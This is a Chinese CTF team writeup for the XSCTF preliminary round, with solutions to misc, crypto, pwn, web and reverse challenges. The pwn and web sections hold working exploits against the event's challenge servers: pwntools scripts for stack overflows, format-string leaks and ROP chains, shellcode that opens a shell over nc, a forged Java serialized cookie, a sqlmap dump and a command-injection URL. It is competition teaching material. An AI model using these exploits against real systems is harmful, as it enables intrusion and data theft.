---
title: XSCTF 初赛 void*队伍wp
date: '2024-12-09 21:13:14'
updated: '2025-09-20 17:23:50'
---
# void *writeup;
## Misc
##### 【新生专属】爱，来自
图片长宽度被修改过，修复得原图：

![](/images/4ee9dc91f7840c01d2aebedb82c61340.png)

##### 【新生专属】saveSaofe1a_partC
简单的图寻：

![](/images/f915d9102e0e97b3f774948575eb0279.png)

直接地图查图中大楼的名字，宁阳广场，  
拍摄地点在网球场

![](/images/516cbd04da8047df148e7bed33edb90f.png)

从卫星地图可以看到离大厦最近的网球场在红色方框那，看了一下是宁夏大学怀远校区  
flag就是：XSCTF{宁夏大学怀远校区}

##### なんで春日影やったの！
用audacity打开Phone.wav，根据数值确定7355608

![](/images/c1bb4ac0f2cebe6833833053f8cc197b.png)

用deepsound打开春日影.wav，得到Chat.zip

## Crypto
##### 【新生专属】凯撒子撒子凯视眈眈
```python
 def decrypt(text):
  offset = 1
  dec = ''
  for w in text:
    if w in string.ascii_letters:
      dec += chr(ord(w) - offset)
    else:
      dec += w
    offset *= -1
 return dec
encrypted_text "YRDSG{L@J_T@_M0JP_ONLN_MPJ0_L0PNP0_RIH_S@M!_U@O!!!}"
decrypted_text = decrypt(encrypted_text)
print(decrypted_text)
```



##### 【新生专属】Baby_xor
由代码可见key长度为7，flag长度为49，且fag前6个字符和最后一个字符均给出，可以反推key为ndqniad。

```python
from itertools import cycle
encoded = b'672:/\x1a\n^\x10.!\x07P\x1d1\x10\x19]6\x12\x10Z\x16\x051+\x14\x101P\x1d[Y>\x10\x06W.]\x07%EOEPOH@\x19'
key = b"ndqniad"
cipher = bytes(x ^ y for x, y in zip(encoded, cycle(key)))
print(cipher)
```

##### 【新生专属】gift RSA
先算出d=invert（e,phi)  
再解密

```python
from Crypto.Util.number import long_to_bytes
n=130440460982994054886194132893343627339035187428107218807321147405620338019874355591446417761513664225266160038818394605319887375239391287230478660163653875242501357695986002630460984513202850115668909532480905521208688225215737924902179053646260998230998190491472420237789646660909155287180241747552560215117
gift=44036549032562248382682022800700872356499366761892236792447591596664499865604669855744690854360939082917175165565199000408965931210082233109686848459850428016737476624525455409019711542678368419364411036613979498284492060998121701989232698779962405921949163953624713959841997664118682769289019562394455997308
d=4348877843780490561458934348108027919126476410736137954041178373762614074086782534557737198970159701118552263375165055047132977019059004266270898461290319515715989124242599106974727337044614244307559192190092778165660261701231085949572257331139301425200953333031194648336896037797094591061613817895899564603
e = 0x10001

m_decrypted = pow(gift, e, n)
flag_bytes = long_to_bytes(m_decrypted)
print(flag_bytes)
```

##### 【新生专属】看板娘
```python
from Crypto.Util.number import*
secret = [7, 31, 11, 36, 32, 34, 27, 8, 10, 7, 5, 35, 0, 0, 1, 4, 27, 30, 28, 16, 7, 12, 10, 24, 13, 15, 17, 1, 12, 13, 18, 23, 6, 26, 36, 0, 21, 36, 23, 21, 32, 13, 25, 5, 15, 21, 20, 1, 7, 36, 3]
base = 37
flag_value = 0
power = 1
for s in secret:
    flag_value += s * power
    power *= base
flag_bytes = long_to_bytes(flag_value)
print(flag_bytes)
```

## Pwn:
##### 【新生专属】rock_paper_scissors
简单的ret2text  
附上exp:

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
ret=0x401825
link=remote("43.248.97.213",30223)
link.recvuntil(b":")
link.sendline(b'a'*0x38+p64(0x4012F2))
link.interactive()
```

##### 【新生专属】c_master
反编译可得base地址为rbp-0x18，以及backdoor：

![](/images/9baaa29af13f21373f06ec5c8c9a66b4.png)

为保持栈16字节对齐，选择0x4012c0  
附上shell script：

```shell
#!/bin/bash
(
echo "base+=8;"
echo "base+=8;"
echo "base+=8;"
echo "read(0,base,0x8);"
printf "\xc0\x12\x40\x00\x00\x00\x00\x00"
echo "return 0;"
cat -
) | nc 43.248.97.213 30248
```

执行即可getshell，然后cat flag即可。

##### c_master_plus
![](/images/0493a64704fa3879762944d5460a7dca.png)

第一次输入利用格式化字符串泄露栈上main函数地址，利用二进制文件内main函数偏移求出程序基址。  
第二次输入%s符合程序要求继续运行至第三次输入。  
第三次输入栈溢出至backdoor成功getshell，cat flag即可获得flag。  
附上exp：

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
link=remote("43.248.97.213",30566)
# link=process('./cmp')
link.recvuntil(b'buf>')
link.sendline(b'%23$p')
main_addr=int(link.recvline().strip(),16)
print(hex(main_addr))
binary_base=main_addr-0x1249
backdoor=binary_base+0x143a
ret=binary_base+0x101a
link.recvuntil(b'fmt>')
link.sendline(b'%s')
link.recvuntil(b'buf>')
# payload=b'a'*0x78+p64(ret)+p64(backdoor)
payload=b'a'*0x78+p64(backdoor)
link.sendline(payload)
link.interactive()
```

##### Wahahabox
x86_64带PIE可以通过读取/proc/self/maps获取text base。

![](/images/371f39f860b2a6b41341f3fdf208b8ac.png)

在有限的buffer中也能读到stack，可以当作rop的一个空间。  
由于第一次read的栈上地址不确定，考虑再次read来读取到已知的地址里面。  
出于未知原因，每次read只有前16个字节不会被破坏，但是flag目录/home/ctf/flag只有14个字节，不受太大的影响。可以在第二次read中插入flag路径。  
由disassembly：

![](/images/efc6563a58230412e01aac23e69a043a.png)

可以看到需要存放一个buffer的指针来进行open。考虑在第三次read进行存放。  
如果直接在第三次read后直接跳转到open()会导致memset把栈上内容整炸，考虑用第四次read来拯救一下。  
stage2 payload构造：

```python
import struct

stack_base_hi = 0x7ffe89298000
text_base = 0x593d70e2e000

payload = b""

first_rbp = stack_base_hi - 0x10008

# first read
payload += b"\x00" * 0x20
payload += struct.pack("<Q", first_rbp) # rbp
payload += struct.pack("<Q", text_base + 0x26b) # restart read
payload += b"\x00" * 0x10 # padding

buf1 = first_rbp - 0x20
second_rbp = stack_base_hi - 0x20008

# second read
payload += b"/home/ctf/flag"
payload += b"\x00" * (0x20 - 14)
payload += struct.pack("<Q", second_rbp) # rbp
payload += struct.pack("<Q", text_base + 0x01a) # ret
payload += struct.pack("<Q", text_base + 0x01a) # ret
payload += struct.pack("<Q", text_base + 0x26b) # restart read

buf2 = second_rbp - 0x20
third_rbp = stack_base_hi - 0x30008

# third read
payload += struct.pack("<Q", buf1)
payload += b"\x00" * (0x20 - 0x8)
payload += struct.pack("<Q", third_rbp) # rbp
payload += struct.pack("<Q", text_base + 0x01a) # ret
payload += struct.pack("<Q", text_base + 0x01a) # ret
payload += struct.pack("<Q", text_base + 0x26b) # restart read

# fourth read
payload += b"\x00" * 0x20
payload += struct.pack("<Q", buf2 + 0x818) # rbp
payload += struct.pack("<Q", text_base + 0x2e9) # open([rbp - 0x818])

with open("payload", "wb") as f:
    f.write(payload)
```

在一个终端中mkfifo payload之后cat - payload | nc 43.248.97.213 30679  
输入/proc/self/maps，回车并ctrl-d后将text_base和stack_base_hi写入stage2 payload构造程序中并执行即可得到flag。  
XSCTF{w4haha_i5_4_g0_m4ste7_0rz_1i4s14}

##### toolong
代码仅使用strlen检查，即让strlen返回1即可。  
shellcode构造：

```python
from pwn import *
context.arch='amd64'
payload = b""

# magic code
payload += b"\xb8\x00\x00\x00\x00" # mov eax, 0
assembly = ""
assembly += shellcraft.amd64.linux.sh()
payload += asm(assembly)
with open("payload", "wb") as f:
    f.write(payload)
```

终端用cat - payload - | nc 43.248.97.213 30697  
enter然后ctrl-d即可弹shell

## Web
Learn_decompilation_and_reflection  
反编译后可以看到POST一个challenge=true以及在cookie中传一个base64的序列化后的User即可。  
payload构造：  
import com.xsctf.ldar.Bean.User;  
import java.lang.reflect.Field;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectOutputStream;  
import java.nio.file.Files;  
import java.nio.file.Path;  
public class Serialize {  
    public static void main(String[] args) throws Throwable {  
        User theUser = new User();  
        Field role = User.class.getDeclaredField("role");  
        role.setAccessible(true);  
        role.set(theUser, "administrator");  
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();  
        try (ObjectOutputStream stream = new ObjectOutputStream(bytes)) {  
            stream.writeObject(theUser);  
        }  
        Files.write(Path.of("payload.bin"), bytes.toByteArray());  
    }  
}  
执行请求：  
#!/bin/bash  
curl -v   
--data-binary '{"challenge": true}'   
--cookie "user_info="$(cat payload.bin | base64 -w0)   
-H "Content-Type: application/json"   
[http://43.248.97.213:30440/CheckPrivilege](http://43.248.97.213:30440/CheckPrivilege)

##### 【新生专属】saveSaofe1a_partA
python3 sqlmap.py -u [http://43.248.97.213:31234/?inject=1](http://43.248.97.213:31234/?inject=1) --dump  
即可拿到retrieved: '小美','3','做ctf题目并找到flag:XSCTF{Saofe1a_r3a11y_l0ve_xiaomei}','114514'

##### 【新生专属】燕子不要走~
使用分号隔开后面的东西即可。  
[http://43.248.97.213:42336/?cmd=cat%20/flag](http://43.248.97.213:42336/?cmd=cat%20/flag);

## Reverse
##### Ro1ling~
发现为pyinstaller，用pyinstxtractor解压后得到Ro1ling.pyc，反编译即可得到：  
secret_message = '𝙓𝙎𝘾𝙏𝙁{𝙁0𝙧_0𝙣𝙘3_𝙮0𝙪_𝙝4𝙫3_7𝙖57𝙚𝙙_𝙛𝙡𝙞𝙜𝙝𝙩_𝙮0𝙪_𝙬1𝙡𝙡_𝙬4𝙡𝙠_7𝙝3_3𝙖𝙧7𝙝_𝙬17𝙝_𝙮0𝙪𝙧_3𝙮35_7𝙪𝙧𝙣3𝙙_5𝙠𝙮𝙬4𝙧𝙙5}'  
提交XSCTF{F0r_0nc3_y0u_h4v3_7a57ed_flight_y0u_w1ll_w4lk_7h3_3ar7h_w17h_y0ur_3y35_7urn3d_5kyw4rd5}  
即可得分

##### Running~
RUN!  
node Running > a.txt  
用文本编辑器打开即可。

![](/images/b1dbbe35733e8e17d788a0b4b5658fb4.png)

##### loglistening
adb install，然后  
$ adb logcat | grep -F "flag{"  
11-02 22:02:34.042 10586 10586 I xilo    : flag{4724110e8c8a83c123d6df82efee8c53}

